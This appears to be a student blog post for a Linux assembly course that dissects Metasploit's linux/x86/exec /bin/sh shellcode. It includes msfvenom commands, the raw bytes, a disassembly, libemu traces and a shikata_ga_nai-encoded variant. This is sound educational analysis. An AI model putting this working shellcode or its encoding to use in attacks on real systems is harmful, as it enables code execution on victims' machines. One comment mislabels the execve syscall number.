I"95<p><br />
Student <strong>SLAE - 891</strong><br />
Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<h3 id="assignment-51">Assignment 5.1:</h3>

<p><strong>Our Goal:</strong></p>
<blockquote>
  <p><em>Take up at least 3 linux/x86 shellcodes using Msfpayload (now Msfvenom)</em></p>
  <ul>
    <li><em>Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode</em></li>
    <li><em>Present your analysis</em><br />
<!--more--></li>
  </ul>
</blockquote>

<p>Hello everybody,</p>

<p>Here we are for the analysis of three Msfvenom shellcodes for the platform linux/x86. Let’s start with the <strong>linux/x86/exec</strong> shellcode with the command <strong>/bin/sh</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/exec CMD=/bin/sh -f c</span>
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes
Final size of c file: 205 bytes
unsigned char buf[] <span class="o">=</span> 
<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">2f"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span><span class="p">;</span>
</code></pre></div></div>

<p>Let’s disassemble the shellcode:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | ndisasm -u -</span>
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes

00000000  6A0B        push byte +0xb
00000002  58          pop eax
00000003  99          cdq
00000004  52          push edx
00000005  66682D63    push word 0x632d
00000009  89E7        mov edi,esp
0000000B  682F736800  push dword 0x68732f
00000010  682F62696E  push dword 0x6e69622f
00000015  89E3        mov ebx,esp
00000017  52          push edx
00000018  E808000000  call dword 0x25
0000001D  2F          das
0000001E  62696E      bound ebp,[ecx+0x6e]
00000021  2F          das
00000022  7368        jnc 0x8c
00000024  005753      add <span class="o">[</span>edi+0x53],dl
00000027  89E1        mov ecx,esp
00000029  CD80        int 0x80
</code></pre></div></div>

<p>Let’s have a look with libemu:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | sctest -vvv -S -s 10000 -G exec_sh.dot &amp;&amp; dot exec_sh.dot -Tpng -o exec_sh.png</span>
</code></pre></div></div>
<p><img src="http://localhost:4000/public/images/slae/assignment5/exec_sh.png" alt="exec_sh" /></p>

<p>Clearly we can see that we will make an execve syscall: <code class="language-plaintext highlighter-rouge">#define __NR_execve 11</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
</code></pre></div></div>

<p>So let’s comment our shellcode instructions:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0xb</span>          <span class="c1">; syscall execve 12</span>
    <span class="nf">pop</span> <span class="nb">eax</span>                 <span class="c1">; syscall number in eax</span>
    <span class="nf">cdq</span>                     <span class="c1">; clears out edx thanks to eax sign extension</span>
    <span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; push 0 or null byte to end the following string</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x632d</span>        <span class="c1">; "-c"</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esp</span>             <span class="c1">; edi stores the @ of "-c"</span>
    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x68732f</span>     <span class="c1">; "/sh"</span>
    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x6e69622f</span>   <span class="c1">; "/bin"</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>             <span class="c1">; ebx is the first arg of execve "/bin/sh"</span>
    <span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; null byte</span>
    <span class="nf">call</span> <span class="kt">dword</span> <span class="mh">0x25</span>         <span class="c1">; push the address of the following string on the stack (and jmp to push edi)</span>
    <span class="nf">das</span>                     <span class="c1">; the following instructions are meaningless because the bytes are corresponding</span>
    <span class="nf">bound</span> <span class="nb">ebp</span><span class="p">,[</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">0x6e</span><span class="p">]</span>    <span class="c1">; to the string "/bin/sh -c /bin/sh" for argv[]</span>
    <span class="nf">das</span>
    <span class="nf">jnc</span> <span class="mh">0x8c</span>
    <span class="nf">add</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mh">0x53</span><span class="p">],</span><span class="nb">dl</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>             <span class="c1">; setting @ for argv</span>
    <span class="nf">int</span> <span class="mh">0x80</span>                <span class="c1">; syscall</span>
</code></pre></div></div>

<p>In order to explain the meaningless intructions after the call instruction:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo -ne \\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68</span>
/bin/sh
<span class="c"># echo -ne \\x57\\x53 | ndisasm -u -</span>
00000000  57                push edi
00000001  53                push ebx
</code></pre></div></div>

<p>EDI points to the string <em>“-c”</em>, EBX points to the string <em>“/bin/sh”</em>. So finally argv[] will have the following arguments:</p>
<ul>
  <li>argv[0]: address of “/bin/sh”</li>
  <li>argv[1]: address of “-c”</li>
  <li>argv[2]: address of “/bin/sh”</li>
</ul>

<p>It can be confirm thanks to libemu:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | sctest -vvv -S -s 10000</span>
...
int execve <span class="o">(</span>
     const char <span class="k">*</span> dateiname <span class="o">=</span> 0x00416fc0 <span class="o">=&gt;</span> 
           <span class="o">=</span> <span class="s2">"/bin/sh"</span><span class="p">;</span>
     const char <span class="k">*</span> argv[] <span class="o">=</span> <span class="o">[</span>
           <span class="o">=</span> 0x00416fb0 <span class="o">=&gt;</span> 
               <span class="o">=</span> 0x00416fc0 <span class="o">=&gt;</span> 
                   <span class="o">=</span> <span class="s2">"/bin/sh"</span><span class="p">;</span>
           <span class="o">=</span> 0x00416fb4 <span class="o">=&gt;</span> 
               <span class="o">=</span> 0x00416fc8 <span class="o">=&gt;</span> 
                   <span class="o">=</span> <span class="s2">"-c"</span><span class="p">;</span>
           <span class="o">=</span> 0x00416fb8 <span class="o">=&gt;</span> 
               <span class="o">=</span> 0x0041701d <span class="o">=&gt;</span> 
                   <span class="o">=</span> <span class="s2">"/bin/sh"</span><span class="p">;</span>
           <span class="o">=</span> 0x00000000 <span class="o">=&gt;</span> 
             none<span class="p">;</span>
     <span class="o">]</span><span class="p">;</span>
     const char <span class="k">*</span> envp[] <span class="o">=</span> 0x00000000 <span class="o">=&gt;</span> 
         none<span class="p">;</span>
<span class="o">)</span> <span class="o">=</span>  0<span class="p">;</span>
...
</code></pre></div></div>

<p>However we can can see some null bytes in our shellcode. Let’s have a look to a shellcode without null bytes:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/exec CMD=/bin/sh -f raw -b \x00 | ndisasm -u -</span>
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes

00000000  DDC5              ffree st5
00000002  D97424F4          fnstenv <span class="o">[</span>esp-0xc]
00000006  58                pop eax
00000007  BE2E1FB4CF        mov esi,0xcfb41f2e
0000000C  33C9              xor ecx,ecx
0000000E  B10B              mov cl,0xb
00000010  31701A            xor <span class="o">[</span>eax+0x1a],esi
00000013  03701A            add esi,[eax+0x1a]
00000016  83C004            add eax,byte +0x4
00000019  E2DB              loop 0xfffffff6
0000001B  75BF              jnz 0xffffffdc
0000001D  97                xchg eax,edi
0000001E  BAD8D94F91        mov edx,0x914fd9d8
00000023  BFAC778110        mov edi,0x108177ac
00000028  DC1F              fcomp qword <span class="o">[</span>edi]
0000002A  51                push ecx
0000002B  07                pop es
0000002C  0D8238B9D8        or eax,0xd8b93882
00000031  A1E8ADD325        mov eax,[0x25d3ade8]
00000036  0C2E              or al,0x2e
00000038  CB                retf
00000039  47                inc edi
0000003A  6540              gs inc eax
0000003C  3CFB              cmp al,0xfb
0000003E  1D9C15A854        sbb eax,0x54a8159c
00000043  7D54              jnl 0x99
00000045  CE                into
</code></pre></div></div>

<p>Now we can see that the shellcode is a slightly more complex because of the shikata_ga_nai encoding routine useful to avoid null bytes.</p>

<p>Hope you enjoyed this post, see you soon for the second msf shellcode analysis.</p>

<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>
:ET